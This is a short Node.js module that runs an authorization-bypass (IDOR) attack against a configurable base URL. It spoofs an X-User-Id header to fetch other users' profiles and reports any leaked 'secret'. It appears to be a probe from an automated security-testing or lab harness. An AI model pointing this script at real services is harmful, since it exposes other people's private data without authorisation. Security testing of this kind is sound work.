const axios = require('axios');

const ATTACKER = 'user-1';
const VICTIMS = ['user-2', 'user-3'];

function truncate(s) {
  if (typeof s !== 'string') s = JSON.stringify(s);
  return s.length > 200 ? s.slice(0, 199) + '…' : s;
}

async function runAuthBypassAttack({ baseUrl }) {
  const start = Date.now();
  const tried = [];

  try {
    const own = await axios.get(`${baseUrl}/profile/${ATTACKER}`, {
      headers: { 'X-User-Id': ATTACKER },
      timeout: 5000,
      validateStatus: () => true,
    });

    if (own.status !== 200) {
      return {
        vulnerability: 'auth-bypass',
        exploited: false,
        payload: null,
        evidence: truncate(`Sanity check failed: GET /profile/${ATTACKER} as ${ATTACKER} returned ${own.status}`),
        durationMs: Date.now() - start,
      };
    }
  } catch (err) {
    return {
      vulnerability: 'auth-bypass',
      exploited: false,
      payload: null,
      evidence: truncate(`Sanity request failed: ${err.message}`),
      durationMs: Date.now() - start,
    };
  }

  for (const victim of VICTIMS) {
    try {
      const res = await axios.get(`${baseUrl}/profile/${victim}`, {
        headers: { 'X-User-Id': ATTACKER },
        timeout: 5000,
        validateStatus: () => true,
      });

      if (res.status === 200 && res.data && typeof res.data === 'object' && 'secret' in res.data) {
        return {
          vulnerability: 'auth-bypass',
          exploited: true,
          payload: `GET /profile/${victim} as ${ATTACKER}`,
          evidence: truncate(`Leaked secret from ${victim}: ${res.data.secret}`),
          durationMs: Date.now() - start,
        };
      }

      if (res.status === 403) {
        tried.push(`GET /profile/${victim}: 403 Forbidden`);
      } else {
        tried.push(`GET /profile/${victim}: ${res.status} (no secret leaked)`);
      }
    } catch (err) {
      tried.push(`GET /profile/${victim}: ${err.message}`);
    }
  }

  return {
    vulnerability: 'auth-bypass',
    exploited: false,
    payload: null,
    evidence: truncate(tried.join('; ')),
    durationMs: Date.now() - start,
  };
}

module.exports = { runAuthBypassAttack };
